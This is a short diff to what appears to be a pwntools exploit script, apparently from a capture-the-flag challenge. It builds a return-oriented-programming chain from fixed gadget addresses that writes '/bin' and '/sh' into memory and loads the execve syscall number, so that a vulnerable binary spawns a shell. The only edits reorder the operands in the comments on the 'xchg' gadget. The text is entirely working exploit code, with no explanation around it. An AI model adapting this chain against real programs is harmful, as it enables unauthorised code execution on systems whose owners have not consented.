@@ -1,7 +1,7 @@
 payload = p64(0x4017d3)
 #0x00000000004017d3: pop rdi; ret; 
 payload += p64(0x6e69622f)+p64(0x426898)
-# 0x0000000000426898: xchg eax, edi; ret; 
+# 0x0000000000426898: xchg edi, eax; ret; 
 payload += p64(0x4017d3)
 # 0x00000000004017d3: pop rdi; ret; 
 payload += p64(0x46a070)+p64(0x44e464)
@@ -9,7 +9,7 @@ payload += p64(0x46a070)+p64(0x44e464)
 payload += p64(0x4017d3)
 # 0x00000000004017d3: pop rdi; ret; 
 payload += p64(0x68662f)+p64(0x426898)
-# 0x0000000000426898: xchg eax, edi; ret; 
+# 0x0000000000426898: xchg edi, eax; ret; 
 payload += p64(0x4017d3)
 # 0x00000000004017d3: pop rdi; ret; 
 payload += p64(0x46a074)+p64(0x44e464)
@@ -17,7 +17,7 @@ payload += p64(0x46a074)+p64(0x44e464)
 payload += p64(0x4017d3)
 # 0x00000000004017d3: pop rdi; ret; 
 payload += p64(0x3b)+p64(0x426898)
-# 0x0000000000426898: xchg eax, edi; ret; 
+# 0x0000000000426898: xchg edi, eax; ret; 
 payload += p64(0x43d52d)
 # 0x000000000043d52d: pop rcx; ret; 
 payload += p64(0x0)+p64(0x4017d3)
